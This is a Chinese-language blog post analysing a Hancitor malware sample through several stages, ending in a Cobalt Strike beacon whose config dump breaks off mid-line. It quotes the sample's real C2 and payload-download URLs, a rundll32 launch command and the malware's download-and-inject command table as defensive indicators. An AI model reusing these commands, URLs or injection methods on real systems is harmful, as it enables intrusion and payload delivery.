<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="scr1pt"><title>scr1pt's blog</title><meta name="description" content="my dear virus, please fuck me"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/scr1pt.jpg"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.1.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a class="current" href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li><li> <a href="/links">Links</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)" style="display:none;"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/scr1pt.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/scr1pt.jpg" style="width:200px;" alt="favicon"><h3 title=""><a href="/">scr1pt's blog</a></h3><div class="description"><p>my dear virus, please fuck me</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/scr1pt-kid"><i class="fa fa-github"></i></a></li><li><a href="mailto:2466811523@qq.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="http://sighttp.qq.com/authd?IDKEY=2466811523"><i class="fa fa-qq"></i></a></li></ul></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> scr1pt</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/28/2021-12-16-hancitor/">2021-12-16-hancitor</a></h3></div><div class="post-content"><div class="card"><p><h2 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h2><p>之前看过两个hancitor的样本，但是从现在看来做的都太简单了，而且当时的各方面知识也都不是很完善。于是找了2021.12.26日的样本重新做一次详尽的分析。</p>
<blockquote>
<p>如果有错误可以联系我</p>
<p>qq：2466811523</p>
<p>mail: <a href="mailto:&#x32;&#52;&#x36;&#x36;&#56;&#x31;&#49;&#x35;&#50;&#x33;&#x40;&#x71;&#113;&#x2e;&#x63;&#111;&#x6d;">&#x32;&#52;&#x36;&#x36;&#56;&#x31;&#49;&#x35;&#50;&#x33;&#x40;&#x71;&#113;&#x2e;&#x63;&#111;&#x6d;</a></p>
</blockquote>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><blockquote>
<p>md5: 9f09b1dd6235c28b091a7dbc9bcd9482<br>sha1: b7ac19b82e2f946e7cc047421875bbade3e880fd<br>sha256: 571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74</p>
<p>vt: <a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/details">https://www.virustotal.com/gui/file/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/details</a></p>
<p>hybrid: <a target="_blank" rel="noopener" href="https://hybrid-analysis.com/sample/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/61bb60be5679f80b2921e45a">https://hybrid-analysis.com/sample/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/61bb60be5679f80b2921e45a</a></p>
<p>Reference:</p>
<p><a target="_blank" rel="noopener" href="http://blog.nsfocus.net/beaconeye-cs/">http://blog.nsfocus.net/beaconeye-cs/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.malware-traffic-analysis.net/2021/12/16/index.html">https://www.malware-traffic-analysis.net/2021/12/16/index.html</a></p>
</blockquote>
<h3 id="区块信息"><a href="#区块信息" class="headerlink" title="区块信息"></a>区块信息</h3><p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220421160905565.png" alt="image-20220421160905565"></p>
<h3 id="导入函数"><a href="#导入函数" class="headerlink" title="导入函数"></a>导入函数</h3><h4 id="kernel32-dll"><a href="#kernel32-dll" class="headerlink" title="kernel32.dll"></a>kernel32.dll</h4><p>导入了EnterCriticalSection,DeleteCriticalSection,Exitprocess,WriteFile，猜测存在文件操作行为，反调试行为。</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220421161324695.png" alt="image-20220421161324695"></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220421161351659.png" alt="image-20220421161351659"></p>
<h4 id="advapi-dll"><a href="#advapi-dll" class="headerlink" title="advapi.dll"></a>advapi.dll</h4><p>存在注册表操作函数</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220421161558623.png" alt="image-20220421161558623"></p>
<h2 id="沙箱行为分析"><a href="#沙箱行为分析" class="headerlink" title="沙箱行为分析"></a>沙箱行为分析</h2><h3 id="网络行为"><a href="#网络行为" class="headerlink" title="网络行为"></a>网络行为</h3><p>沙箱中存在网络行为</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220424145411025.png" alt="image-20220424145411025"></p>
<h4 id="post"><a href="#post" class="headerlink" title="post"></a>post</h4><p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220424151443896.png" alt="image-20220424151443896"></p>
<p>传的数据经过了加密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DATA=R1VJRD0xMDQyMzA1MTAwMTU0MjczNTA4NCZCVUlMRD0xNjEyX21jeHBsa2pnJklORk89ODM1MTgwIEAgREVTS1RPUC03MTZUNzcxXGhhcmR6JkVYVD0mSVA9MTAyLjEyOS4xNDMuNjImVFlQRT0xJldJTj0xMC4wKHg2NCkA</span><br></pre></td></tr></table></figure>



<h3 id="注册表行为"><a href="#注册表行为" class="headerlink" title="注册表行为"></a>注册表行为</h3><p>设置了<code>HKU\S-1-5-21-575823232-3065301323-1442773979-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\[ProxyServer/ProxyEnable]</code>,http启用代理。</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220421170202661.png" alt="image-20220421170202661"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">46 00 00 00 04 01 00 00 03 00 00 00 14 00 00 00 65 78 74 72 61 63 74 6F 72 2E 70 72 6F 78 79 3A 38 30 38 30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 D0 5C 01 4D C1 D5 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>得到的主要信息为我们获得了代理服务器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">65 78 74 72 61 63 74 6F 72 2E 70 72 6F 78 79 3A 38 30 38 30</span><br><span class="line">extractor.proxy:8080</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/4283027/whats-the-format-of-the-defaultconnectionsettings-value-in-the-windows-registry">What’s the format of the DefaultConnectionSettings value in the Windows registry?</a></p>
</blockquote>
<p>regsvc32.exe</p>
<p>可疑注册表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER_Classes\dllfile\AutoRegister</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\dllfile\AutoRegister</span><br></pre></td></tr></table></figure>

<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220424152518074.png" alt="image-20220424152518074"></p>
<h3 id="进程行为"><a href="#进程行为" class="headerlink" title="进程行为"></a>进程行为</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%windir%\System32\svchost.exe -k WerSvcGroup</span><br><span class="line">wmiadap.exe /F /T /R</span><br><span class="line">&quot;c:\windows\system32\regsvr32.exe&quot; C:\Users\ADMINI~1\AppData\Local\Temp\b7ac19b82e2f946e7cc047421875bbade3e880fd.dll</span><br><span class="line">C:\Windows\system32\WerFault.exe -u -p 2088 -s 300</span><br><span class="line">&quot;c:\windows\system32\rundll32.exe&quot; C:\Users\ADMINI~1\AppData\Local\Temp\b7ac19b82e2f946e7cc047421875bbade3e880fd.dll, DllRegisterServer</span><br></pre></td></tr></table></figure>

<h3 id="注册服务"><a href="#注册服务" class="headerlink" title="注册服务"></a>注册服务</h3><p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220424143052701.png" alt="image-20220424143052701"></p>
<h3 id="Mutex"><a href="#Mutex" class="headerlink" title="Mutex"></a>Mutex</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Local\WERReportingForProcess2088</span><br><span class="line">Global\10443951-6e48-11ec-95c3-6c4b90457b65</span><br><span class="line">DBWinMutex</span><br></pre></td></tr></table></figure>

<h3 id="Decoded-Config"><a href="#Decoded-Config" class="headerlink" title="Decoded Config"></a>Decoded Config</h3><blockquote>
<p>{“Campaign Id”: “1612_mcxplkjg”, “C2 list”: [“<a target="_blank" rel="noopener" href="http://hiltustra.com/9/forum.php&quot;">http://hiltustra.com/9/forum.php&quot;</a>, “<a target="_blank" rel="noopener" href="http://corelince.ru/9/forum.php&quot;">http://corelince.ru/9/forum.php&quot;</a>, “<a target="_blank" rel="noopener" href="http://mernwel.ru/9/forum.php&quot;]%7D">http://mernwel.ru/9/forum.php&quot;]}</a></p>
<p>from ZenBox</p>
</blockquote>
<h3 id="antiDebug"><a href="#antiDebug" class="headerlink" title="antiDebug"></a>antiDebug</h3><p>这里还不太清楚为什么这个regsvr32.exe会被识别为anti-debug</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220424144202382.png" alt="image-20220424144202382"></p>
<h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220424145455392.png" alt="image-20220424145455392"></p>
<h3 id="行为图"><a href="#行为图" class="headerlink" title="行为图"></a>行为图</h3><p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220424145855421.png" alt="image-20220424145855421"></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220424145626481.png" alt="image-20220424145626481"></p>
<h2 id="反汇编分析"><a href="#反汇编分析" class="headerlink" title="反汇编分析"></a>反汇编分析</h2><p>导出函数DllRegisterServer如下</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425130446643.png" alt="image-20220425130446643"></p>
<h3 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h3><p>导出函数的第一个函数为，这里可以看到<code>QueryPerformanceCounter</code>函数，是用于检测时间的函数</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425135412146.png" alt="image-20220425135412146"></p>
<p><code>sub_1000786D</code>函数中调用了<code>SetUnhandledExceptionFilter</code>函数，一般用于引发异常的反调试，当引发异常后会跳转到TopLevelException</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425140009666.png" alt="image-20220425140009666"></p>
<p>看看TopLevelExceptionFilter，应该是动态解密的数据。</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425135244692.png" alt="image-20220425135244692"></p>
<ul>
<li>QueryPerformanceCounter</li>
<li>IsProcessorFeaturePresent</li>
<li>SetUnhandledExceptionFilter</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/profileapi/nf-profileapi-queryperformancecounter">https://docs.microsoft.com/en-us/windows/win32/api/profileapi/nf-profileapi-queryperformancecounter</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-setunhandledexceptionfilter">https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-setunhandledexceptionfilter</a></p>
<h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p>debug DllRegisterServer</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425130918278.png" alt="image-20220425130918278"></p>
<p>在加密数据处打硬件访问断点然后运行后到达如下</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425153401093.png" alt="image-20220425153401093"></p>
<p>这边已经开始对内存地址进行清零了，说明这段数据已经解密成功并存储到内存地址的某处了，我们直接打开内存布局，找到具有执行权限的内存区域</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425153612582.png" alt="image-20220425153612582"></p>
<p>执行完后发现0xf00000（随机生成）区域处内存如下，此时可以dump出我们Stage2 payload</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425155004204.png" alt="image-20220425155004204"></p>
<h2 id="Stage2-Payload"><a href="#Stage2-Payload" class="headerlink" title="Stage2 Payload"></a>Stage2 Payload</h2><h3 id="启动方式"><a href="#启动方式" class="headerlink" title="启动方式"></a>启动方式</h3><p>向本地发送10个ping数据包，并使用<code>rundll32.exe</code>执行<code>iff.bin</code>文件的导出函数<code>WCWGVXGWTDGAWLW</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c ping localhost -n 10 &amp;&amp; rundll32.exe iff.bin,WCWGVXGWTDGAWLW</span><br></pre></td></tr></table></figure>

<h3 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h3><blockquote>
<p>md5: c90ad5fe64f4f02fb1f77005f95161d6<br>sha1: def89402bbff6a694c0adc82ee0d937f0a02182c<br>sha256: 19a7b1957104c4c01958ff3be6cc6688c9d34f725180bd4cc7d1373228dfbbc8</p>
</blockquote>
<p>导出函数<code>WCWGVXGWTDGAWLW</code></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425162446941.png" alt="image-20220425162446941"></p>
<h4 id="sub-10001519"><a href="#sub-10001519" class="headerlink" title="sub_10001519"></a><code>sub_10001519</code></h4><p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426143423341.png" alt="image-20220426143423341"></p>
<h5 id="mw-sendHostConfigAndRead"><a href="#mw-sendHostConfigAndRead" class="headerlink" title="mw_sendHostConfigAndRead"></a><code>mw_sendHostConfigAndRead</code></h5><p>首先获取主机的各种信息包括系统、主机名、公网IP、系统位数,然后根据系统位数进行生成配置信息，并准备加密发送给远程主机。</p>
<blockquote>
<p>The <strong>DsEnumerateDomainTrusts</strong> function obtains domain trust data for a specified domain. </p>
<p>关于域信任关系：在同一个域内,成员服务器根据Active Directory中的用户账号,可以很容易地把资源分配给域内的用户.但一个域的作用范围毕竟有限,有些企业会用到多个域,那么在多域环境下,我们该如何进行资源的跨域分配呢？也就是说,我们该如何把A域的资源分配给B域的用户呢？一般来说,我们有两种选择,一种是使用镜像账户.也就是说,我们可以在A域和B域内各自创建一个用户名和口令都完全相同的用户账户,然后在B域把资源分配给这个账户后,A域内的镜像账户就可以访问B域内的资源了</p>
<p>红队通过收集域信任关系从而进行横向移动.通过调用DSEnumerateDomainTrusts() Win32 API,来进行枚举</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425163412862.png" alt="image-20220425163412862"></p>
</blockquote>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426135038998.png" alt="image-20220426135038998"></p>
<p>主机信息会通过base64加密，最后由网络行为发送到远程主机</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425193018919.png" alt="image-20220425193018919"></p>
<h6 id="mw-Internet"><a href="#mw-Internet" class="headerlink" title="mw_Internet"></a>mw_Internet</h6><p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426135136434.png"></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426135154090.png" alt="image-20220426135154090"></p>
<h5 id="mwDecryptReadData"><a href="#mwDecryptReadData" class="headerlink" title="mwDecryptReadData"></a>mwDecryptReadData</h5><p>那么我们可以通过这段代码获得什么呢？也就是返回数据的解密方式</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426140528240.png" alt="image-20220426140528240"></p>
<p>首先跳过前四个字节也就是<code>35 30 0d 0a</code>，然后首先进行base64解密，然后xor解密即可得到payload</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426140540839.png" alt="image-20220426140540839"></p>
<p>我们解密一下malware-traffic中的流量包数据</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426140056032.png" alt="image-20220426140056032"></p>
<h5 id="mw-commandList"><a href="#mw-commandList" class="headerlink" title="mw_commandList"></a>mw_commandList</h5><p>看到后面就会发现这几个字符没有参与加密，为传入的命令列表字符串。</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426143122263.png" alt="image-20220426143122263"></p>
<h5 id="mw-judgeCommand"><a href="#mw-judgeCommand" class="headerlink" title="mw_judgeCommand"></a>mw_judgeCommand</h5><blockquote>
<p>命令</p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Detail</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>b:</strong></td>
<td>Download and inject into svchost.exe</td>
</tr>
<tr>
<td><strong>e:</strong></td>
<td>Download and inject into running process</td>
</tr>
<tr>
<td><strong>l:</strong></td>
<td>Download shellcode and inject into svchost.exe or current process</td>
</tr>
<tr>
<td><strong>r:</strong></td>
<td>Download and inject into svchost.exe, check file its downloading</td>
</tr>
<tr>
<td><strong>n:</strong></td>
<td>Do not download (could be utilized as a check to see if victim still active)</td>
</tr>
</tbody></table>
<p>但是2021.12.16日这个样本中多了一条命令f</p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Detail</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>b:</strong></td>
<td>Download and inject into svchost.exe</td>
</tr>
<tr>
<td><strong>e:</strong></td>
<td>Download and inject into running process</td>
</tr>
<tr>
<td><strong>l:</strong></td>
<td>Download shellcode and inject into svchost.exe or current process</td>
</tr>
<tr>
<td><strong>r:</strong></td>
<td>Download and inject into svchost.exe, check file its downloading</td>
</tr>
<tr>
<td><strong>n:</strong></td>
<td>Do not download (could be utilized as a check to see if victim still active)</td>
</tr>
<tr>
<td><strong>f:</strong></td>
<td>Download the shellcode,infect into the svchost.exe or the running process.(start a thread that inherit the object handle,then inject into the shellcode)</td>
</tr>
</tbody></table>
</blockquote>
<h6 id="command-n"><a href="#command-n" class="headerlink" title="command n"></a>command n</h6><p>Do not download (could be utilized as a check to see if victim still active)</p>
<h6 id="command-b"><a href="#command-b" class="headerlink" title="command b"></a>command b</h6><p>Download and inject into svchost.exe</p>
<ul>
<li>heapAlloc</li>
<li>getPayload</li>
</ul>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426150058134.png" alt="image-20220426150058134"></p>
<h6 id="command-e-l"><a href="#command-e-l" class="headerlink" title="command e,l"></a>command e,l</h6><p>e:Download and inject into running process</p>
<p>l:Download shellcode and inject into svchost.exe or current process</p>
<ul>
<li>heapAlloc</li>
<li>getPayload</li>
</ul>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426150629206.png" alt="image-20220426150629206"></p>
<h6 id="command-f"><a href="#command-f" class="headerlink" title="command f"></a>command f</h6><ul>
<li><p>HeapAlloc</p>
</li>
<li><p>getPayload</p>
</li>
</ul>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426150811588.png" alt="image-20220426150811588"></p>
<h6 id="command-r"><a href="#command-r" class="headerlink" title="command r"></a>command r</h6><p>Download and inject into svchost.exe, check file its downloading</p>
<ul>
<li><p>HeapAlloc</p>
</li>
<li><p>getPayload</p>
</li>
</ul>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426151343946.png" alt="image-20220426151343946"></p>
<h6 id="command-f-1"><a href="#command-f-1" class="headerlink" title="command f"></a>command f</h6><p>我们看一下这里f传入了<code>HANDLE_FLAG_INHERIT</code>参数</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426124924383.png" alt="image-20220426124924383"></p>
<p>这意味着会创建一个继承了父进程对象handle的子进程</p>
<table>
<thead>
<tr>
<th align="left">Value</th>
<th align="left">Meaning</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>HANDLE_FLAG_INHERIT</strong>0x00000001</td>
<td align="left">If this flag is set, a child process created with the <em>bInheritHandles</em> parameter of <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcess</a> set to <strong>TRUE</strong> will inherit the object handle.</td>
</tr>
</tbody></table>
<p>主要代码逻辑在<code>sub_10002A0B</code>函数里</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426125918651.png" alt="image-20220426125918651"></p>
<p>首先check一下hProcess也就是<code>HANDLE_FLAG_INHERIT</code>，该参数默认值为1，如果不存在的话就通过线程的方式启动shellcode，存在的话就以代码注入的方式启动。</p>
<blockquote>
<p>这里代码设定死了参数，也就是这里只会以代码注入svchost.exe的方式启动</p>
</blockquote>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426151117849.png" alt="image-20220426151117849"></p>
<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>配置文件仍然使用sha1和rc4加密，前8byte用sha1加密，然后使用rc4解密pbData即可</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220428112736032.png" alt="image-20220428112736032"></p>
<p>decrypt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1612_mcxplkjg...http://hiltustra.com/9/forum.php|http://corelince.ru/9/forum.php|http://mernwel.ru/9/forum.php|</span><br></pre></td></tr></table></figure>

<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220428123831330.png" alt="image-20220428123831330"></p>
<h2 id="Stage3-Payload"><a href="#Stage3-Payload" class="headerlink" title="Stage3 Payload"></a>Stage3 Payload</h2><p>那么第二阶段的payload也分析完毕了，我们看看第三阶段的payload会执行什么操作呢？首先我们得先提取出第三阶段的payload,上面说到我们已经提取出了流量中我们得到的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;f:http://sineko7.ru/37s.bin&#125;&#123;f:http://sineko7.ru/37.bin&#125;</span><br></pre></td></tr></table></figure>

<p>然后shellcode加载可以断到<code>InternetConnectA</code>函数,C2的Ip地址为<code>104.128.232.37</code></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426202435662.png" alt="image-20220426202435662"></p>
<p>这段shellcode的伪代码，是<strong>Metasploit</strong>的动态函数的混淆方式，利用hashdb恢复函数逻辑</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220427153630325.png" alt="image-20220427153630325"></p>
<p>然后shellcode的代码逻辑如下</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220427172330409.png" alt="image-20220427172330409"></p>
<p>通过<code>HttpRequestA</code>访问<code>104.128.232.37/bfGM</code></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220427112022448.png" alt="image-20220427112022448"></p>
<p><code>HttpSendRequestA</code>发送请求，然后如果请求成功后会用<code>InternetReadFile</code>去读取下一阶段的payload</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220427112238919.png" alt="image-20220427112238919"></p>
<p>然后会发现shellcode大部分相同，只是访问的URL修改为了&#x2F;TdSQ.</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/%E6%88%AA%E5%B1%8F2022-04-27%2017.47.19.png" alt="截屏2022-04-27 17.47.19"></p>
<h2 id="Stage4-Payload"><a href="#Stage4-Payload" class="headerlink" title="Stage4 Payload"></a>Stage4 Payload</h2><p>经调试发现如下代码动调解密了后面的代码</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220427183907285.png" alt="image-20220427183907285"></p>
<p>执行完后会发现Dos Stub头,我们可以dump出PE文件</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220427184002914.png" alt="image-20220427184002914"></p>
<h2 id="Stage5-Payload"><a href="#Stage5-Payload" class="headerlink" title="Stage5 Payload"></a>Stage5 Payload</h2><p>函数入口位于导出函数<code>ReflectiveLoader</code>，是beacon.dll的导出函数</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220427184816791.png" alt="image-20220427184816791"></p>
<p>用PE-bear打开发现确实是beacon.dll</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220428094738533.png" alt="image-20220428094738533"></p>
<p>由于beacon对配置的异或密钥是固定的，我们可以直接通过cyberchef对beacon提取c2（3.x版本的CobaltStrike默认是0x69，对4.x版本的CobalStrike默认是0x2e）</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220428095422065.png" alt="image-20220428095422065"></p>
<p>利用脚本提取config，虽然这里显示有已知的私钥，但经过尝试发现无法解密cs流量的cookie。猜测私钥错误。由于私钥没有泄漏导致cookie和后面的命令无法解密。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">File: loader_009E0000.bin</span><br><span class="line">payloadType: 0x10015044</span><br><span class="line">payloadSize: 0x00000000</span><br><span class="line">intxorkey: 0x00000000</span><br><span class="line">id2: 0x00000000</span><br><span class="line">Config found: xorkey b&#x27;.&#x27; 0x00030620 0x00032ec2</span><br><span class="line">0x0001 payload type                     0x0001 0x0002 0 windows-beacon_http-reverse_http</span><br><span class="line">0x0002 port                             0x0001 0x0002 80</span><br><span class="line">0x0003 sleeptime                        0x0002 0x0004 60000</span><br><span class="line">0x0004 maxgetsize                       0x0002 0x0004 1048576</span><br><span class="line">0x0005 jitter                           0x0001 0x0002 0</span><br><span class="line">0x0007 publickey                        0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100a70991d69d816a601ffa80976473830f0d3b41276d2790401ddedb18e2d3cab3c315e3222325be42b65adb2878f33f5a03ff5010b23e842a510c1482ad6a42f1e7e5726eb31813e7437640ed7879955f401e172c34d3517241596dd41f8e48d3d1b1c288e6c8752ff65dc27acccba4ba9cd6d0e4de6196cea4da480d3b99d0ed020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 Has known private key</span><br><span 